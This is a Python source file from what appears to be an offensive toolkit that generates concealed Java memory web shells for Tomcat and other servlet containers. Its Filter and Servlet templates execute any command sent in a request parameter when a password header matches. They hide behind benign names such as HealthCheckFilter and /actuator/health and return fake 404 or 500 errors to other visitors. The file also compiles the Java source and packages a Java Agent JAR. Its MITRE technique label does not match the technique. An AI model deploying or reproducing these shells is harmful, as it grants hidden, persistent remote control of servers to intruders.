"""Memory shell generator for Java deserialization exploitation.

Provides:
- Filter/Servlet memory shell generation for multiple containers
- Java Agent memory shell generation
- Memory shell verification and uninstallation
- Stealth techniques for memory shell concealment
"""

import asyncio
import base64
import logging
import secrets
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class ContainerType(Enum):
    """Java container types."""
    TOMCAT = "tomcat"
    SPRING = "spring"
    WEBLOGIC = "weblogic"
    JETTY = "jetty"
    RESIN = "resin"
    JBOSS = "jboss"
    GLASSFISH = "glassfish"


class ShellType(Enum):
    """Memory shell types."""
    FILTER = "filter"
    SERVLET = "servlet"
    AGENT = "agent"


class ShellFunction(Enum):
    """Memory shell functions."""
    COMMAND_EXEC = "command_exec"
    FILE_MANAGER = "file_manager"
    DATABASE_QUERY = "database_query"
    REVERSE_SHELL = "reverse_shell"


@dataclass
class MemShellConfig:
    """Memory shell configuration.

    Attributes:
        shell_type: Type of memory shell
        container_type: Target container type
        shell_function: Shell function
        shell_name: Shell component name (disguised)
        shell_url: Shell URL path
        password: Shell access password
        listen_host: Reverse shell listener host
        listen_port: Reverse shell listener port
        stealth_mode: Enable stealth mode
        mock_response: Mock response type (404/500/normal)
        hook_classes: Classes to hook (for Agent)
    """
    shell_type: ShellType = ShellType.FILTER
    container_type: ContainerType = ContainerType.TOMCAT
    shell_function: ShellFunction = ShellFunction.COMMAND_EXEC
    shell_name: str = "DefaultFilter"
    shell_url: str = "/api/health"
    password: str = ""
    listen_host: str = ""
    listen_port: int = 0
    stealth_mode: bool = True
    mock_response: str = "404"
    hook_classes: List[str] = field(default_factory=list)


@dataclass
class MemShellResult:
    """Memory shell generation result.

    Attributes:
        shell_id: Unique shell identifier
        shell_type: Generated shell type
        container_type: Target container type
        payload_class: Generated class bytecode
        payload_base64: Base64 encoded payload
        payload_size: Payload size in bytes
        injection_command: Command to inject the shell
        verification_url: URL to verify shell is alive
        verification_passed: Whether verification succeeded
        uninstall_command: Command to uninstall the shell
        mitre_technique: MITRE ATT&CK technique ID
        generation_time: Generation timestamp
        error_message: Error message if failed
    """
    shell_id: str = ""
    shell_type: ShellType = ShellType.FILTER
    container_type: ContainerType = ContainerType.TOMCAT
    payload_class: bytes = b""
    payload_base64: str = ""
    payload_size: int = 0
    injection_command: str = ""
    verification_url: str = ""
    verification_passed: bool = False
    uninstall_command: str = ""
    mitre_technique: str = "T1566.001"
    generation_time: float = 0.0
    error_message: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "shell_id": self.shell_id,
            "shell_type": self.shell_type.value,
            "container_type": self.container_type.value,
            "payload_base64": self.payload_base64,
            "payload_size": self.payload_size,
            "injection_command": self.injection_command,
            "verification_url": self.verification_url,
            "verification_passed": self.verification_passed,
            "uninstall_command": self.uninstall_command,
            "mitre_technique": self.mitre_technique,
        }


class MemShellGenerator:
    """Memory shell generator for Java containers.

    Provides Filter/Servlet/Agent memory shell generation,
    verification, and uninstallation capabilities.
    """

    STEALTH_NAMES: Dict[ContainerType, List[str]] = {
        ContainerType.TOMCAT: [
            "DefaultFilter", "MonitorFilter", "HealthCheckFilter",
            "MetricsFilter", "AuthFilter", "CorsFilter",
            "RequestLoggingFilter", "SecurityFilter",
        ],
        ContainerType.SPRING: [
            "SecurityFilter", "CorsFilter", "MetricsFilter",
            "HealthFilter", "TraceFilter", "ActuatorFilter",
        ],
        ContainerType.WEBLOGIC: [
            "WebLogicFilter", "ClusterFilter", "SessionFilter",
            "CacheFilter", "ProxyFilter",
        ],
        ContainerType.JETTY: [
            "JettyFilter", "GzipFilter", "QoSFilter",
            "CrossOriginFilter", "RewriteFilter",
        ],
        ContainerType.RESIN: [
            "ResinFilter", "CacheFilter", "AuthFilter",
            "LogFilter", "CompressFilter",
        ],
    }

    STEALTH_URLS: List[str] = [
        "/api/health", "/api/status", "/api/version",
        "/actuator/health", "/actuator/info",
        "/monitoring/status", "/system/health",
        "/admin/status", "/debug/health",
        "/metrics/health", "/check/status",
    ]

    FILTER_TEMPLATE_TOMCAT = """
import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;
import java.util.*;

public class {class_name} implements Filter {{
    private static final String PASSWORD = "{password}";
    private static final String HEADER_KEY = "X-Request-Id";
    
    public void init(FilterConfig config) throws ServletException {{}}
    
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {{
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        
        String cmd = req.getHeader(HEADER_KEY);
        if (cmd != null && cmd.equals(PASSWORD)) {{
            String execCmd = req.getParameter("cmd");
            if (execCmd != null) {{
                try {{
                    Process p = Runtime.getRuntime().exec(execCmd);
                    BufferedReader reader = new BufferedReader(
                        new InputStreamReader(p.getInputStream()));
                    StringBuilder output = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {{
                        output.append(line).append("\\n");
                    }}
                    resp.getWriter().write(output.toString());
                    resp.getWriter().flush();
                }} catch (Exception e) {{
                    resp.getWriter().write("Error: " + e.getMessage());
                }}
            }}
            return;
        }}
        
        {stealth_response}
        chain.doFilter(request, response);
    }}
    
    public void destroy() {{}}
}}
"""

    SERVLET_TEMPLATE_TOMCAT = """
import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;

public class {class_name} extends HttpServlet {{
    private static final String PASSWORD = "{password}";
    private static final String HEADER_KEY = "X-Request-Id";
    
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {{
        String cmd = req.getHeader(HEADER_KEY);
        if (cmd != null && cmd.equals(PASSWORD)) {{
            String execCmd = req.getParameter("cmd");
            if (execCmd != null) {{
                try {{
                    Process p = Runtime.getRuntime().exec(execCmd);
                    BufferedReader reader = new BufferedReader(
                        new InputStreamReader(p.getInputStream()));
                    StringBuilder output = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {{
                        output.append(line).append("\\n");
                    }}
                    resp.getWriter().write(output.toString());
                }} catch (Exception e) {{
                    resp.getWriter().write("Error: " + e.getMessage());
                }}
            }}
        }} else {{
            {stealth_response}
        }}
    }}
    
    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {{
        doGet(req, resp);
    }}
}}
"""

    AGENT_TEMPLATE = """
import java.lang.instrument.*;
import java.security.*;

public class {class_name} {{
    private static Instrumentation instrumentation;
    
    public static void premain(String agentArgs, Instrumentation inst) {{
        instrumentation = inst;
        inst.addTransformer(new {class_name}Transformer(), true);
    }}
    
    public static void agentmain(String agentArgs, Instrumentation inst) {{
        premain(agentArgs, inst);
    }}
    
    static class {class_name}Transformer implements ClassFileTransformer {{
        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                ProtectionDomain protectionDomain, byte[] classfileBuffer) {{
            {hook_logic}
            return classfileBuffer;
        }}
    }}
}}
"""

    def __init__(
        self,
        exploit_executor: Optional[Any] = None,
        reverse_platform: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize memory shell generator.

        Args:
            exploit_executor: Exploit executor instance.
            reverse_platform: Reverse connection platform instance.
            event_bus: Event bus for broadcasting events.
        """
        self.exploit_executor = exploit_executor
        self.reverse_platform = reverse_platform
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._generated_shells: Dict[str, MemShellResult] = {}

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("MemShell Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("MemShell: %s", message)

    async def generate_filter_shell(
        self,
        config: MemShellConfig,
    ) -> Optional[MemShellResult]:
        """Generate Filter memory shell.

        Args:
            config: Memory shell configuration.

        Returns:
            MemShellResult or None.
        """
        start_time = time.time()
        result = MemShellResult(
            shell_id=f"filter_{int(time.time())}_{secrets.token_hex(4)}",
            shell_type=ShellType.FILTER,
            container_type=config.container_type,
            generation_time=time.time(),
        )

        try:
            await self._report_progress("生成Filter内存马", 10)
            await self._report_log(f"目标容器: {config.container_type.value}")

            class_name = config.shell_name
            if not class_name:
                stealth_names = self.STEALTH_NAMES.get(config.container_type, [])
                class_name = stealth_names[0] if stealth_names else "DefaultFilter"

            password = config.password or secrets.token_hex(8)

            stealth_response = self._build_stealth_response(config.mock_response)

            source_code = self.FILTER_TEMPLATE_TOMCAT.format(
                class_name=class_name,
                password=password,
                stealth_response=stealth_response,
            )

            await self._report_progress("编译字节码", 40)
            bytecode = await self._compile_java_source(source_code, class_name)

            if not bytecode:
                result.error_message = "字节码编译失败"
                return result

            await self._report_progress("生成注入命令", 70)
            injection_cmd = self._build_filter_injection_command(
                config.container_type,
                class_name,
                config.shell_url,
            )

            verification_url = f"http://target{config.shell_url}"

            result.payload_class = bytecode
            result.payload_base64 = base64.b64encode(bytecode).decode("utf-8")
            result.payload_size = len(bytecode)
            result.injection_command = injection_cmd
            result.verification_url = verification_url
            result.uninstall_command = self._build_filter_uninstall_command(
                config.container_type,
                class_name,
            )

            await self._report_progress("完成", 100)
            await self._report_log(
                f"Filter内存马生成成功: {result.shell_id} "
                f"({result.payload_size} bytes)"
            )

            self._generated_shells[result.shell_id] = result

        except Exception as e:
            result.error_message = str(e)
            await self._report_log(f"Filter内存马生成失败: {e}")
            logger.error("Filter shell generation failed: %s", e)

        return result

    async def generate_servlet_shell(
        self,
        config: MemShellConfig,
    ) -> Optional[MemShellResult]:
        """Generate Servlet memory shell.

        Args:
            config: Memory shell configuration.

        Returns:
            MemShellResult or None.
        """
        start_time = time.time()
        result = MemShellResult(
            shell_id=f"servlet_{int(time.time())}_{secrets.token_hex(4)}",
            shell_type=ShellType.SERVLET,
            container_type=config.container_type,
            generation_time=time.time(),
        )

        try:
            await self._report_progress("生成Servlet内存马", 10)
            await self._report_log(f"目标容器: {config.container_type.value}")

            class_name = config.shell_name
            if not class_name:
                stealth_names = self.STEALTH_NAMES.get(config.container_type, [])
                class_name = stealth_names[0] if stealth_names else "MonitorServlet"

            password = config.password or secrets.token_hex(8)

            stealth_response = self._build_stealth_response(config.mock_response)

            source_code = self.SERVLET_TEMPLATE_TOMCAT.format(
                class_name=class_name,
                password=password,
                stealth_response=stealth_response,
            )

            await self._report_progress("编译字节码", 40)
            bytecode = await self._compile_java_source(source_code, class_name)

            if not bytecode:
                result.error_message = "字节码编译失败"
                return result

            await self._report_progress("生成注入命令", 70)
            injection_cmd = self._build_servlet_injection_command(
                config.container_type,
                class_name,
                config.shell_url,
            )

            verification_url = f"http://target{config.shell_url}"

            result.payload_class = bytecode
            result.payload_base64 = base64.b64encode(bytecode).decode("utf-8")
            result.payload_size = len(bytecode)
            result.injection_command = injection_cmd
            result.verification_url = verification_url
            result.uninstall_command = self._build_servlet_uninstall_command(
                config.container_type,
                class_name,
            )

            await self._report_progress("完成", 100)
            await self._report_log(
                f"Servlet内存马生成成功: {result.shell_id} "
                f"({result.payload_size} bytes)"
            )

            self._generated_shells[result.shell_id] = result

        except Exception as e:
            result.error_message = str(e)
            await self._report_log(f"Servlet内存马生成失败: {e}")
            logger.error("Servlet shell generation failed: %s", e)

        return result

    async def generate_agent_shell(
        self,
        config: MemShellConfig,
    ) -> Optional[MemShellResult]:
        """Generate Java Agent memory shell.

        Args:
            config: Memory shell configuration.

        Returns:
            MemShellResult or None.
        """
        start_time = time.time()
        result = MemShellResult(
            shell_id=f"agent_{int(time.time())}_{secrets.token_hex(4)}",
            shell_type=ShellType.AGENT,
            container_type=config.container_type,
            generation_time=time.time(),
        )

        try:
            await self._report_progress("生成Agent内存马", 10)
            await self._report_log(f"目标容器: {config.container_type.value}")

            class_name = config.shell_name or "MonitorAgent"

            hook_logic = self._build_agent_hook_logic(config.hook_classes)

            source_code = self.AGENT_TEMPLATE.format(
                class_name=class_name,
                hook_logic=hook_logic,
            )

            await self._report_progress("编译Agent字节码", 40)
            bytecode = await self._compile_java_source(source_code, class_name)

            if not bytecode:
                result.error_message = "Agent字节码编译失败"
                return result

            await self._report_progress("打包JAR", 60)
            jar_bytes = await self._package_agent_jar(bytecode, class_name)

            await self._report_progress("生成注入命令", 80)
            injection_cmd = self._build_agent_injection_command(
                config.container_type,
                jar_bytes,
            )

            result.payload_class = jar_bytes
            result.payload_base64 = base64.b64encode(jar_bytes).decode("utf-8")
            result.payload_size = len(jar_bytes)
            result.injection_command = injection_cmd
            result.verification_url = "agent://internal"
            result.uninstall_command = self._build_agent_uninstall_command(
                config.hook_classes,
            )

            await self._report_progress("完成", 100)
            await self._report_log(
                f"Agent内存马生成成功: {result.shell_id} "
                f"({result.payload_size} bytes)"
            )

            self._generated_shells[result.shell_id] = result

        except Exception as e:
            result.error_message = str(e)
            await self._report_log(f"Agent内存马生成失败: {e}")
            logger.error("Agent shell generation failed: %s", e)

        return result

    async def verify_shell_alive(
        self,
        shell_id: str,
        target_url: str,
        password: str = "",
        timeout: float = 10.0,
    ) -> bool:
        """Verify memory shell is alive.

        Args:
            shell_id: Shell identifier.
            target_url: Target URL to test.
            password: Shell access password.
            timeout: Request timeout.

        Returns:
            True if shell is alive.
        """
        try:
            shell = self._generated_shells.get(shell_id)
            if not shell:
                return False

            if self.exploit_executor:
                response = await self.exploit_executor.send_heartbeat(
                    url=target_url,
                    password=password,
                    timeout=timeout,
                )
                if response:
                    shell.verification_passed = True
                    return True

            return False

        except Exception as e:
            logger.error("Shell verification failed: %s", e)
            return False

    async def uninstall_shell(
        self,
        shell_id: str,
        target_url: str,
        password: str = "",
    ) -> bool:
        """Uninstall memory shell.

        Args:
            shell_id: Shell identifier.
            target_url: Target URL.
            password: Shell access password.

        Returns:
            True if uninstallation successful.
        """
        try:
            shell = self._generated_shells.get(shell_id)
            if not shell:
                return False

            uninstall_cmd = shell.uninstall_command
            if self.exploit_executor:
                result = await self.exploit_executor.execute_command(
                    url=target_url,
                    command=uninstall_cmd,
                    password=password,
                )
                if result:
                    del self._generated_shells[shell_id]
                    await self._report_log(f"内存马卸载成功: {shell_id}")
                    return True

            return False

        except Exception as e:
            logger.error("Shell uninstallation failed: %s", e)
            return False

    def _build_stealth_response(self, mock_type: str) -> str:
        """Build stealth response code.

        Args:
            mock_type: Mock response type (404/500/normal).

        Returns:
            Java code for stealth response.
        """
        if mock_type == "404":
            return 'resp.sendError(HttpServletResponse.SC_NOT_FOUND, "Not Found");'
        elif mock_type == "500":
            return 'resp.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "Internal Error");'
        else:
            return 'resp.setStatus(HttpServletResponse.SC_OK);'

    def _build_agent_hook_logic(self, hook_classes: List[str]) -> str:
        """Build Agent hook logic.

        Args:
            hook_classes: List of classes to hook.

        Returns:
            Java code for hook logic.
        """
        if not hook_classes:
            return "return classfileBuffer;"

        hooks: List[str] = []
        for cls in hook_classes:
            hook = f"""
            if ("{cls}".equals(className)) {{
                // Hook logic for {cls}
                // Intercept and log method calls
            }}
            """
            hooks.append(hook)

        return "\n".join(hooks) + "\nreturn classfileBuffer;"

    async def _compile_java_source(
        self,
        source: str,
        class_name: str,
    ) -> Optional[bytes]:
        """Compile Java source to bytecode.

        Args:
            source: Java source code.
            class_name: Class name.

        Returns:
            Compiled bytecode or None.
        """
        try:
            import subprocess
            import tempfile
            import os

            with tempfile.TemporaryDirectory() as tmpdir:
                src_file = os.path.join(tmpdir, f"{class_name}.java")
                with open(src_file, "w", encoding="utf-8") as f:
                    f.write(source)

                proc = await asyncio.create_subprocess_exec(
                    "javac",
                    src_file,
                    cwd=tmpdir,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await proc.communicate()

                if proc.returncode == 0:
                    class_file = os.path.join(tmpdir, f"{class_name}.class")
                    with open(class_file, "rb") as f:
                        return f.read()
                else:
                    logger.error("Compilation failed: %s", stderr.decode())
                    return None

        except Exception as e:
            logger.error("Java compilation failed: %s", e)
            return None

    async def _package_agent_jar(
        self,
        bytecode: bytes,
        class_name: str,
    ) -> bytes:
        """Package Agent bytecode into JAR.

        Args:
            bytecode: Agent bytecode.
            class_name: Agent class name.

        Returns:
            JAR file bytes.
        """
        try:
            import zipfile
            import io

            jar_buffer = io.BytesIO()
            with zipfile.ZipFile(jar_buffer, "w", zipfile.ZIP_DEFLATED) as jar:
                jar.writestr(f"{class_name}.class", bytecode)
                jar.writestr(
                    "META-INF/MANIFEST.MF",
                    f"Manifest-Version: 1.0\n"
                    f"Agent-Class: {class_name}\n"
                    f"Premain-Class: {class_name}\n"
                    f"Can-Redefine-Classes: true\n"
                    f"Can-Retransform-Classes: true\n",
                )

            return jar_buffer.getvalue()

        except Exception as e:
            logger.error("JAR packaging failed: %s", e)
            return bytecode

    def _build_filter_injection_command(
        self,
        container: ContainerType,
        class_name: str,
        url: str,
    ) -> str:
        """Build Filter injection command.

        Args:
            container: Target container type.
            class_name: Filter class name.
            url: Filter URL mapping.

        Returns:
            Injection command string.
        """
        if container == ContainerType.TOMCAT:
            return (
                f"Inject Filter: {class_name} -> {url}\n"
                f"Use ysoserial to inject Filter registration code"
            )
        elif container == ContainerType.SPRING:
            return (
                f"Inject Filter: {class_name} -> {url}\n"
                f"Use Spring Boot Actuator endpoint to register filter"
            )
        else:
            return f"Inject Filter: {class_name} -> {url}"

    def _build_servlet_injection_command(
        self,
        container: ContainerType,
        class_name: str,
        url: str,
    ) -> str:
        """Build Servlet injection command.

        Args:
            container: Target container type.
            class_name: Servlet class name.
            url: Servlet URL mapping.

        Returns:
            Injection command string.
        """
        return (
            f"Inject Servlet: {class_name} -> {url}\n"
            f"Use ysoserial to inject Servlet registration code"
        )

    def _build_agent_injection_command(
        self,
        container: ContainerType,
        jar_bytes: bytes,
    ) -> str:
        """Build Agent injection command.

        Args:
            container: Target container type.
            jar_bytes: Agent JAR bytes.

        Returns:
            Injection command string.
        """
        return (
            f"Inject Agent via VirtualMachine.attach(pid)\n"
            f"Load JAR ({len(jar_bytes)} bytes) into target JVM"
        )

    def _build_filter_uninstall_command(
        self,
        container: ContainerType,
        class_name: str,
    ) -> str:
        """Build Filter uninstall command.

        Args:
            container: Target container type.
            class_name: Filter class name.

        Returns:
            Uninstall command string.
        """
        return (
            f"Remove Filter: {class_name}\n"
            f"Restore original FilterChain"
        )

    def _build_servlet_uninstall_command(
        self,
        container: ContainerType,
        class_name: str,
    ) -> str:
        """Build Servlet uninstall command.

        Args:
            container: Target container type.
            class_name: Servlet class name.

        Returns:
            Uninstall command string.
        """
        return (
            f"Remove Servlet: {class_name}\n"
            f"Unregister Servlet from ServletContext"
        )

    def _build_agent_uninstall_command(
        self,
        hook_classes: List[str],
    ) -> str:
        """Build Agent uninstall command.

        Args:
            hook_classes: List of hooked classes.

        Returns:
            Uninstall command string.
        """
        classes = ", ".join(hook_classes) if hook_classes else "all"
        return (
            f"Remove Agent hooks for: {classes}\n"
            f"Restore original class definitions"
        )

    def get_shell_history(self) -> List[MemShellResult]:
        """Get memory shell generation history.

        Returns:
            List of generated shells.
        """
        return list(self._generated_shells.values())

    def get_shell_by_id(self, shell_id: str) -> Optional[MemShellResult]:
        """Get memory shell by ID.

        Args:
            shell_id: Shell identifier.

        Returns:
            MemShellResult or None.
        """
        return self._generated_shells.get(shell_id)
